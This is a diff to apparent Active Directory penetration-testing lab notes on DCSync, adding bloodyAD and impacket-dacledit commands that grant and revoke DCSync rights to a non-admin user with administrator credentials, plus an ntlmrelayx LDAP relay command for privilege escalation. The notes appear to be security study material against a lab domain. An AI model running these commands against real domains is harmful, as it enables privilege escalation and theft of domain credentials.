@@ -145,12 +145,22 @@ Misconfigured permissions can let non-admin users do this.
 - Locate the Domain Object, navigate to the root of the domain (e.g., ignite.local).
 
 #if you have any domain admins and administrator credentials make any non admin user misconfigure.
+
 sudo bloodyAD --host 192.168.154.134 -d MARVEL.local -u Administrator -p 'P@$$w0rd' add dcsync fcastle
 
 #remove non admin user from misconfig
 sudo bloodyAD --host 192.168.154.134 -d MARVEL.local -u Administrator -p 'P@$$w0rd' remove dcsync fcastle
 
 
+#using impacket-dacledit add:
+impacket-dacledit Marvel.local/Administrator:'P@$$w0rd' -action write -rights DCSync -principal fcastle -target-dn 'DC=Marvel,DC=local' -dc-ip 192.168.154.134
+
+#remove impacket-dacledit remove:
+impacket-dacledit Marvel.local/Administrator:'P@$$w0rd' -action remove -rights DCSync -principal fcastle -target-dn 'DC=Marvel,DC=local' -dc-ip 192.168.154.134
+
+
+#using relay:
+impacket-ntlmrelayx -t ldap://192.168.154.134 --escalate-user
 
 
 ```
